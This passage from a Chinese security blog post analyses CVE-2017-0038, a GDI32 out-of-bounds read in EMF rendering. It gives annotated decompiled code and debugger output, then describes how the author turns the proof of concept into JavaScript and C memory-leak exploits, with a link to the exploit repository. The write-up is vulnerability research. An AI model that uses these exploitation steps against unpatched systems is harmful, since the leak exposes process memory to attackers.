&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;8),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;9)&nbsp;-&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;17),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;10),//宽和高，0x10
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;11),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v15,//this&nbsp;is&nbsp;important&nbsp;pointer，指向要拷贝的bitmap指针
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v11,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;16),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xCC0020u)&nbsp;!=&nbsp;0;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这个函数调用，会拷贝当前的图像像素到目标的设备（画布）中，而这个过程拷贝的内容就是v15，这个v15变量是指向要拷贝内容的指针，而拷贝取决于之前我们定义的cxSrc和cySrc，拷贝的大小是cxSrc*cySrc*4，而当前v15的值是什么呢，这取决于EMRSETDIBITSTODEVICE结构体的offBitsSrc，这里就是当前结构体偏移+0x74的位置。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">0:026&gt;&nbsp;p
gdi32full!MRSETDIBITSTODEVICE::bPlay+0x1a4:
00007ffd`cf88e104&nbsp;ff1596ee0300&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[gdi32full!_imp_StretchDIBits&nbsp;(00007ffd`cf8ccfa0)]&nbsp;ds:00007ffd`cf8ccfa0={GDI32!StretchDIBits&nbsp;(00007ffd`d1143370)}
0:026&gt;&nbsp;dd&nbsp;29606a4a0dc+74
00000296`06a4a150&nbsp;&nbsp;00ed1c24&nbsp;0000000e&nbsp;00000014&nbsp;00000000
00000296`06a4a160&nbsp;&nbsp;00000010&nbsp;00000014&nbsp;18abea8b&nbsp;90018400</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">而本来图像大小是取决于BITMAPINFOHEADER和EMRSETIDIBITSTODEVICE共同决定,在BITMAPINFOHEADER中的很多因素决定了图像bitmap的性质,比如bicompression决定了图像的压缩算法或者是否压缩(本实例中为0x0,no compression,这样才能正常泄露内存),而图像内容的偏移和bitmap内容保存在EMRSETDIBITSTODEVICE,但在上述的分析过程中,bplay处理逻辑并没有对要拷贝的内容的大小和图像本身大小bBitsSrc进行比较，而直接拷贝了，导致拷贝了cxSrc*cySrc*3的内存空间，造成了内存泄露。这里为了4字节对齐，会对泄露的内存空间的3字节补上一个0xFF。（笔者注：感谢@程序人生对文章的质疑，这里笔者在进行分析的过程中，在最后这个过程直接参照了0patch文章中的漏洞成因，而没有详细分析StrechToDIB函数的逻辑）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">下面我贴出这个函数的伪代码，相关注释已经写在伪代码中。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">__int64&nbsp;__fastcall&nbsp;MRSETDIBITSTODEVICE::bPlay(MRSETDIBITSTODEVICE&nbsp;*this,&nbsp;void&nbsp;*a2,&nbsp;struct&nbsp;tagHANDLETABLE&nbsp;*a3)
{
&nbsp;&nbsp;HDC&nbsp;v3;&nbsp;//&nbsp;r15@1
&nbsp;&nbsp;MRSETDIBITSTODEVICE&nbsp;*v4;&nbsp;//&nbsp;rbx@1
&nbsp;&nbsp;struct&nbsp;tagHANDLETABLE&nbsp;*v5;&nbsp;//&nbsp;r14@1
&nbsp;&nbsp;unsigned&nbsp;int&nbsp;v6;&nbsp;//&nbsp;edi@1
&nbsp;&nbsp;__int64&nbsp;v7;&nbsp;//&nbsp;rax@1
&nbsp;&nbsp;__int64&nbsp;v8;&nbsp;//&nbsp;rbp@1
&nbsp;&nbsp;signed&nbsp;int&nbsp;v10;&nbsp;//&nbsp;eax@9
&nbsp;&nbsp;BITMAPINFO&nbsp;*v11;&nbsp;//&nbsp;rax@11
&nbsp;&nbsp;const&nbsp;BITMAPINFO&nbsp;*v12;&nbsp;//&nbsp;rsi@11
&nbsp;&nbsp;signed&nbsp;int&nbsp;v13;&nbsp;//&nbsp;eax@12
&nbsp;&nbsp;int&nbsp;v14;&nbsp;//&nbsp;eax@14
&nbsp;&nbsp;unsigned&nbsp;__int32&nbsp;v15;&nbsp;//&nbsp;er9@16
&nbsp;&nbsp;char&nbsp;*v16;&nbsp;//&nbsp;r8@19
&nbsp;&nbsp;struct&nbsp;tagPOINT&nbsp;pt;&nbsp;//&nbsp;[sp+A0h]&nbsp;[bp+18h]@6
&nbsp;&nbsp;v3&nbsp;=&nbsp;(HDC)a2;
&nbsp;&nbsp;v4&nbsp;=&nbsp;this;
&nbsp;&nbsp;v5&nbsp;=&nbsp;a3;
&nbsp;&nbsp;v6&nbsp;=&nbsp;0;
&nbsp;&nbsp;LODWORD(v7)&nbsp;=&nbsp;pvClientObjGet(a3-&gt;objectHandle[0],&nbsp;4587520i64);//a3是头部，判断ENHMETA_SIGNATURE是不是EMF
&nbsp;&nbsp;v8&nbsp;=&nbsp;v7;
&nbsp;&nbsp;if&nbsp;(&nbsp;!v7&nbsp;||&nbsp;!(unsigned&nbsp;int)MRSETDIBITSTODEVICE::bCheckRecord(v4,&nbsp;v5)&nbsp;)//满足v6是EMF，且bCheckRecord会对EMRSETDIBITSTODEVICE结构体成员变量的大小作检查（仅仅是对结构体各自成员变量大小，而没有检查bitmap整体size）
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0i64;
&nbsp;&nbsp;if&nbsp;(&nbsp;MF::bClipped((MF&nbsp;*)v8,&nbsp;(MRSETDIBITSTODEVICE&nbsp;*)((char&nbsp;*)v4&nbsp;+&nbsp;8))&nbsp;)//这个函数会check&nbsp;MF和ERECTL的上下左右值，是否在满足范围内
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1i64;
&nbsp;&nbsp;pt.x&nbsp;=&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;6);//对EMF的xDest和yDest进行传递
&nbsp;&nbsp;pt.y&nbsp;=&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;7);
&nbsp;&nbsp;if&nbsp;(&nbsp;!LPtoDP(*(HDC&nbsp;*)(v8&nbsp;+&nbsp;728),&nbsp;&amp;pt,&nbsp;1)//将逻辑坐标转换成HDC的坐标
&nbsp;&nbsp;&nbsp;&nbsp;||&nbsp;!SetWorldTransform(v3,&nbsp;(const&nbsp;XFORM&nbsp;*)(v8&nbsp;+&nbsp;704))//建立用于转换，输出图形的二维线形变换
&nbsp;&nbsp;&nbsp;&nbsp;||&nbsp;!(unsigned&nbsp;int)MR::bValidOffExt(v4,&nbsp;v5,&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;12),&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;13))&nbsp;)//检查bitmap信息正确性
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0i64;
&nbsp;&nbsp;}
&nbsp;&nbsp;v10&nbsp;=&nbsp;1272;
&nbsp;&nbsp;if&nbsp;(&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;13)&nbsp;&gt;&nbsp;0x4F8u&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;v10&nbsp;=&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;13);
&nbsp;&nbsp;v11&nbsp;=&nbsp;(BITMAPINFO&nbsp;*)LocalAlloc(0x40u,&nbsp;(unsigned&nbsp;int)v10);//开辟一个V10（4f8）大小的空间
&nbsp;&nbsp;v12&nbsp;=&nbsp;v11;
&nbsp;&nbsp;if&nbsp;(&nbsp;v11&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;memcpy(v11,&nbsp;(char&nbsp;*)v4&nbsp;+&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;12),&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;13));//拷贝bitmapinfo到目标内存
&nbsp;&nbsp;&nbsp;&nbsp;v13&nbsp;=&nbsp;248;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v12-&gt;bmiHeader.biSize&nbsp;&lt;&nbsp;0xF8&nbsp;)判断bitmapinfoheader中bisize大小
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v13&nbsp;=&nbsp;v12-&gt;bmiHeader.biSize;//小于f8则当前值
&nbsp;&nbsp;&nbsp;&nbsp;v12-&gt;bmiHeader.biSize&nbsp;=&nbsp;v13;//大于f8则f8，限定bisize最大值
&nbsp;&nbsp;&nbsp;&nbsp;v14&nbsp;=&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;18);//
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;v12-&gt;bmiHeader.biHeight&nbsp;&lt;=&nbsp;0&nbsp;)//如果biHeight为负数，则转换成正数（防止Integer&nbsp;Overflow？）
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v14&nbsp;=&nbsp;-v14;
&nbsp;&nbsp;&nbsp;&nbsp;v12-&gt;bmiHeader.biHeight&nbsp;=&nbsp;v14;
&nbsp;&nbsp;&nbsp;&nbsp;v12-&gt;bmiHeader.biSizeImage&nbsp;=&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;15);//设定bitmapinfoheader中biSizeImage值为cbBitsSrc
&nbsp;&nbsp;&nbsp;&nbsp;v15&nbsp;=&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;15);//cbBitSize交给v15
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;!v15&nbsp;||&nbsp;(unsigned&nbsp;int)MR::bValidOffExt(v4,&nbsp;v5,&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;14),&nbsp;v15)&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;15)&nbsp;)//如果cbBitSize不为0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v16&nbsp;=&nbsp;(char&nbsp;*)v4&nbsp;+&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;14);//则v16为EMRSETDIBSITODEVICE结构+偏移14，也就是offBitsSrc
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v16&nbsp;=&nbsp;0i64;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOBYTE(v6)&nbsp;=&nbsp;StretchDIBits(//拷贝目标像素到指定矩形中,没有判断，产生漏洞
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v3,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pt.x,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pt.y,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;10),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;11),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;8),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;9)&nbsp;-&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;17),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;10),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;11),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v16,//指向要拷贝bitmap的指针
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;v12,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((_DWORD&nbsp;*)v4&nbsp;+&nbsp;16),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xCC0020u)&nbsp;!=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;}
&nbsp;&nbsp;LocalFree((HLOCAL)v12);
&nbsp;&nbsp;MF::bSetTransform((MF&nbsp;*)v8,&nbsp;v3);
&nbsp;&nbsp;return&nbsp;v6;
}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">JS Exploit与Web Safe Color</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">到此，我们分析了这个漏洞的成因，可能读到这里大家都会有一些和我当时一样的疑问，就是为什么我们要打印的内容是0x00ED1C24，也就是说，这里不管内存如何泄露，固定不变的值应该是0x00ED1C24，但是像诸如0patch文章中所说的，固定的值却是0xFF3333FF呢。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先我们一起来把这个PoC修改成Exploit，用JS在网页中打印泄露的内存地址，在之前我们将cxSrc和cySrc修改回泄露内存的PoC，接下来，通过getImageData的方法，来获得图像的像素，之后将这个值打印。打印的Length实际上我输出多了，这里只需要1024（0x10*0x10*4）足以表示整个poc.emf图像。</span></p><p style="text-align:center"><img src="http://p5.qhimg.com/t01e885efbc1a702ebc.png" title="t0164d1f8c1a9c21080.png" alt="http://p9.qhimg.com/t0164d1f8c1a9c21080.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，我们泄露了内存地址的信息，这些信息其实在本质上是包含着很多内容的。比如一些关键的内存地址信息等等。但是在测试的过程中，我没有发现有关浏览器的一些信息，比如cookie之类的，不知道是不是因为我的浏览器比较干净，内存驻留的信息较少。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t011cfbeb077d3f1adc.png" title="t01b488e610a67adb80.png" alt="http://p1.qhimg.com/t01b488e610a67adb80.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">但这里有几个问题，第一个就是我多次调试之后，发现内存泄露的信息位置很不稳定，也就是说，它可以用来泄露浏览器信息，但是用来做稳定的info leak来bypass ASLR似乎不太可行，其次，我们来对比一下泄露内存的内容和我之前在浏览器中打印的图像泄露的内容是不同的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这也是为什么无论是我调试还是0patch文章中都会在浏览器打印0xFF3333FF的原因，Web Safe Color！Web Safe Color是一种安全颜色的表示，开发者认为在256种颜色中，只需要216种颜色就能保证浏览器稳定输出图像，而不会让图像产生抖动，而这216种颜色用0x00,0x33,0x66,0x99,0xcc,0xff组合就能表示了，也就是说我们的内存在图像打印的时候，会被web safe color强制转换。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">下面我修改poc.emf中bitmap的像素值，来看看在浏览器中图像强制转换打印的内容。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01ca3888babdbb49b5.png" title="t01c5280e58c351f757.png" alt="http://p9.qhimg.com/t01c5280e58c351f757.png"/></p><p style="text-align:center"><img src="http://p5.qhimg.com/t012dda0869686117e6.png" title="t019bd38cb5040f6496.png" alt="http://p1.qhimg.com/t019bd38cb5040f6496.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">所以可以看到这个过程不可逆，因此，至少在IE11浏览器，由于Web Safe Color导致我们内存泄露方法获取一些敏感数据的思路似乎不太可行，接下来，我们通过C语言来写一个Exploit，来看一下真正的内存泄露。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">CVE-2017-0038 Out-of-bound Read Exploit</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">重新回过头看一下之前的bplay函数断点，实际上，这里调用了一个GDI32的API，叫做PlayEnhMetaFile，正是这个API内层函数调用到了bplay，因此我们在C中通过PlayEnhMetaFile来调用MRSETDIBITSTODEVICE::bplay。这个过程会将EMF文件转储到hdc上，这样，我们就构建了一个基本的Exploit思路：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过GetDC函数来获取一个HDC</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过GetEnhMetaFile来加载poc.emf</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过PlayEnhMetaFile来将hemf转储到hedc中</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过GetPixel来从hedc中读取像素值，这个像素值泄露了内存信息，保存到一个DWORD数组里。</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t019a885e2b03edff4c.png" title="t01ad1db62de8de8a08.png" alt="http://p5.qhimg.com/t01ad1db62de8de8a08.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，我们的DWORD color[]数组读取到了更多的内存信息，但其实在我们当前的进程空间里，这样的内存信息还是太少了，换句话说当前进程太单纯2333，我们可以正常打印PJ0提供的一个poc.emf，由于这个GetDC是Null，图像将会打印在左上角。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01973b23532c4e10a4.png" title="t01ade368589df47845.png" alt="http://p7.qhimg.com/t01ade368589df47845.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">可以看到，除了左下角的0x00241ced，其他的都是0x00</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">（#00000000表示黑色）</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">，也就是初始化的内存空间（这里0x00241ced也是红色），到此我们完成了对于这个漏洞的分析和利用，如有不当之处，还望大家多多包含，多多交流，谢谢！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后我把exploit地址放在末尾：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="https://github.com/k0keoyo/CVE-2017-0038-EXP-C-JS" _src="https://github.com/k0keoyo/CVE-2017-0038-EXP-C-JS">https://github.com/k0keoyo/CVE-2017-0038-EXP-C-JS</a>&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="white-space: normal; text-indent: 2em;"><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/3644.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【漏洞分析】CVE-2017-0038：GDI32越界读漏洞从分析到Exploit - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3644" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/11x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12581" user-name="夏侯爺當家" href="javascript:;">
                夏侯爺當家            </a>
                        <span class="comment-time">2017-03-23 17:50:53</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12581">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12581" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">//@我叫0day谁找我_: web safe color是一个磨人的小妖精，最后发现这个洞并不一定像推特上说的可以泄露浏览器敏感数据，GDI32里还有好多有意思的东西我用js和c写的exp已经放在文章末尾，js考错了文件稍微差一点，今晚会更新成最新的</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/11x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12579" user-name="Chu______" href="javascript:;">
                Chu______            </a>
                        <span class="comment-time">2017-03-23 12:11:10</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12579">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12579" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">你是不是想叫老子给你送工卡去</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/11x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12578" user-name="小小小小小轻年" href="javascript:;">
                小小小小小轻年            </a>
                        <span class="comment-time">2017-03-23 12:11:10</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12578">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12578" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">10086个赞 ¡查看动图</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/5x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="12577" user-name="老实敦厚的大宝" href="javascript:;">
                老实敦厚的大宝            </a>
                        <span class="comment-time">2017-03-23 12:11:10</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="12577">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_12577" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">@我叫0day谁找我_ 请吃饭吧</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/12x48x48.png">
